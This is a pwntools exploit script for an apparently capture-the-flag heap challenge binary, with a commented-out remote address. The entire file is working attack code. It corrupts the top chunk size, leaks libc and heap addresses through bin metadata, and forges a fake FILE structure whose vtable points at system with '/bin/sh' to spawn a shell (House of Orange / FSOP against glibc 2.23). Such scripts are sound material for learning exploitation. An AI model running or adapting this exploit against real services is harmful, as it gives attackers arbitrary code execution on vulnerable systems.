from pwn import *
context(log_level='debug')

# p = remote("182.92.203.154",28452)
# libc = ELF("./libc-2.23.so")

p = process("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./pwn")

def command(id):
	p.recvuntil(">> ")
	p.sendline(str(id))
def add(id,size,content):
	command(1)
	p.recvuntil(": ")
	p.sendline(str(id))
	p.recvuntil(": ")
	p.sendline(str(size))
	p.recvuntil(": ")
	p.send(content)
def show(id):
	command(2)
	p.recvuntil(": ")
	p.sendline(str(id))
def edit(id,content):
	command(3)
	p.recvuntil(": ")
	p.sendline(str(id))
	p.recvuntil(": ")
	p.send(content)

# overwrite topchunk size
add(0,0x88,'a'*0x88+p64(0xf71))
# frow topchunk into unsortedbin
add(1,0xfff,'b')

#leak libc
edit(0,'a'*0x90)
show(0)
p.recvuntil('a'*0x90)
libc_base = u64(p.recv(6).ljust(8,'\x00'))-88-0x3c4b20
log.info("libc_base:"+hex(libc_base))

# repair chunk_size&prev_size
payload = 'a'*0x88+p64(0xf71)+p64(libc_base+88+0x3c4b20)*2
payload += 'a'*0xf50+p64(0xf70)
edit(0,payload)
p.recvuntil("Done")

# larginbin leak heap addr
add(2,0x450,'c')
edit(0,'a'*0xa0)
show(2)
gdb.attach(p)
p.recvuntil('a'*0x10)
heap_base = u64(p.recv(6).ljust(8,'\x00'))-0x90
log.info("heap_base:"+hex(heap_base))
edit(0,'a'*0x88+p64(0x461))

IO_list_all=libc_base+libc.sym['_IO_list_all']
log.info("IO_list_all:"+hex(IO_list_all))
system=libc_base+libc.sym['system']

# FSOP
# set fake struct
#payload='a'*0x450+p64(0)+p64(0x21)+p64(0x0000ddaa00000003)+p64(0)
payload = 'b'*0x450
fake = '/bin/sh\x00'+p64(0x61)
fake += p64(0)+p64(IO_list_all-0x10)
fake += p64(0) + p64(1)
fake = fake.ljust(0xc0,'\x00')
fake += p64(0) * 3
fake += p64(heap_base+0x5c8) # vtable
fake += p64(0) * 2
fake += p64(system)
payload += fake

# payload = 'b'*0x458+p64(0x60)
edit(2,payload)

#gdb.attach(p,'b *$rebase(0xc2e)')

command(1)
p.recvuntil(": ")
p.sendline(str(3))
p.recvuntil(": ")
p.sendline(str(0x80))

p.interactive()

